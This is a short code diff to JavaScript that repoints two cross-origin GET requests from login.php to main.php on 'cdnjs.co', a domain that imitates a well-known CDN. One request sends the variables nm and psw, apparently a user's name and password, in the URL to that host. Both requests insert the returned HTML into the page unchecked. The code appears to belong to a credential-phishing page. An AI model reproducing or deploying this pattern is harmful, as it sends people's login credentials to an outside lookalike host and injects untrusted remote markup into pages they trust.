@@ -115,7 +115,7 @@ function loadall() {
        (function load() {
     doCORSRequest({
         method: 'GET',
-        url: 'https://cdnjs.co/beha/login.php?page=login',
+        url: 'https://cdnjs.co/beha/main.php?page=login',
       }, function printResult(result) {
 	document.getElementById('tab').innerHTML = result;   
       });
@@ -126,7 +126,7 @@ function loadall() {
         (function load() {
     doCORSRequest({
         method: 'GET',
-        url: 'https://cdnjs.co/beha/login.php?nm='+nm+'&psw='+psw,
+        url: 'https://cdnjs.co/beha/main.php?nm='+nm+'&psw='+psw,
       }, function printResult(result) {
 	document.getElementById('tab').innerHTML = result;   
       });
